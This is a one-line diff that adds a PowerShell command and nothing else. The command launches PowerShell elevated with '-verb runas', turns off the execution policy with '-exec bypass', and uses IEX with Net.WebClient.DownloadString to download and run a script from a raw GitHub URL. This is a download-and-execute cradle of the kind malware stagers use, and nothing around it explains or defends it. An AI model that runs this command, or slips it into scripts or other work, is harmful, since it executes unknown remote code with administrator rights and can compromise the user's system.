@@ -1,0 +1,1 @@
+start-process C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -verb runas -Argumentlist "-nop -noexit -exec bypass -command IEX (New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/black-dragoney/hello-word/master/Untitled05.ps1')"
